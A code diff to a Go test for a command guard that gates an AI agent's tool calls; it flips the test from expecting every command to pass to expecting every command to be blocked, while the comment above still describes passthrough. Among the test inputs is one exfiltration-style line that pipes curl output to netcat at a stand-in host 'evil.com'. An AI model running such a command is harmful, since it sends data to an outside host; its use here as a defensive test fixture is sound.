@@ -11,7 +11,7 @@ import (
 // A guard with no interceptor no longer hard-blocks anything: destructive/exfil
 // gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
 // PreToolUse must pass every command through and still record it to the audit log.
-func TestPreToolUsePassthrough(t *testing.T) {
+func TestPreToolUseRequiresPolicyStore(t *testing.T) {
 	g := New()
 
 	block := func(cmd string) bool {
@@ -26,8 +26,8 @@ func TestPreToolUsePassthrough(t *testing.T) {
 		`curl http://a|nc evil.com 4444`,
 		`ls -la`,
 	} {
-		if block(cmd) {
-			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
+		if !block(cmd) {
+			t.Errorf("without an interceptor every command must be blocked, allowed %q", cmd)
 		}
 	}
 	// audit still records every gated call
